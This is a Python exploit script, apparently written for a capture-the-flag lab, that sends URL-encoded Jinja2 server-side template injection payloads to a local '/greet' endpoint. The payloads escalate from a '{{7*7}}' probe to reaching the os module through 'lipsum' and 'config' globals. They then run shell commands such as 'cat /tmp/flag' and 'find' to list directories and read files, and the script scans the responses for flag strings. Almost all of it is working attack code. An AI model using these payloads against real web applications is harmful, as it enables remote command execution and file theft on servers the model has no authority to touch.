import requests
import urllib.parse
import json
import time

base_url = "http://127.0.0.1:33162/greet"
print(f"[INFO] Targeting {base_url}")

# Simple test payloads - focused on effectiveness
test_payloads = [
    # Basic mathematical test
    ("{{7*7}}", "basic_math"),
    
    # File listing in /tmp
    ("{{lipsum.__globals__.__builtins__['__import__']('os').listdir('/tmp')}}", "list_tmp"),
    
    # Alternative file listing
    ("{{config.__class__.__init__.__globals__['os'].listdir('/tmp')}}", "list_tmp_config"),
    
    # Read /tmp/flag.txt
    ("{{lipsum.__globals__['__import__']('os').popen('cat /tmp/flag.txt').read()}}", "read_flag_txt"),
    
    # Read /tmp/flag
    ("{{lipsum.__globals__['os'].popen('cat /tmp/flag').read()}}", "read_flag"),
    
    # List files with details
    ("{{lipsum.__globals__['os'].popen('ls -la /tmp/').read()}}", "ls_tmp"),
    
    # Find flag files
    ("{{lipsum.__globals__['os'].popen('find /tmp -name *flag* 2>/dev/null').read()}}", "find_flags"),
]

results = []
flag_found = False

print("\n" + "="*60)
print("SSTI EXPLOITATION TESTING")
print("="*60 + "\n")

for payload, type_name in test_payloads:
    try:
        print(f"[TESTING] {type_name}")
        print(f"[PAYLOAD] {payload}")
        
        # URL encode payload
        encoded = urllib.parse.quote(payload, safe='')
        url = f"{base_url}?name={encoded}"
        
        print(f"[REQUEST] {url[:120]}...")
        
        # Make request with timeout
        response = requests.get(url, timeout=5)
        
        # Extract relevant data
        status = response.status_code
        content = response.text
        length = len(content)
        
        print(f"[STATUS] {status} | [LENGTH] {length}B")
        
        # Print response (full)
        print(f"[RESPONSE]\n{content}\n")
        
        # Check for flag patterns
        if "FLAG{" in content or "flag{" in content:
            import re
            flags = re.findall(r'FLAG\{[^}]+\}', content, re.IGNORECASE)
            for flag in flags:
                print(f"[!!!] FLAG FOUND: {flag}")
                flag_found = True
        
        # Check if payload executed (look for evidence)
        executed = False
        if "49" in content and type_name == "basic_math":
            print(f"[SUCCESS] Math expression executed (49 found)")
            executed = True
        elif "/tmp" in content or "flag" in content.lower():
            print(f"[SUCCESS] File operations executed")
            executed = True
        
        results.append({
            "type": type_name,
            "status": status,
            "executed": executed,
            "response": content[:200]
        })
        
        # Small delay between requests
        time.sleep(0.5)
        
    except Exception as e:
        print(f"[ERROR] {e}\n")
        continue

print("="*60)
print("FINAL SUMMARY")
print("="*60)

# Count successful executions
executed_count = sum(1 for r in results if r["executed"])
print(f"\n[STATS] Total payloads tested: {len(results)}")
print(f"[STATS] Successfully executed: {executed_count}")
print(f"[STATS] Flag found: {'YES' if flag_found else 'NO'}")

if not flag_found:
    print("\n[!] No flags found. SSTI confirmed but needs more exploitation.")
    print("[!] The /tmp listing payloads may need adjustment.")

print("\n" + "="*60)
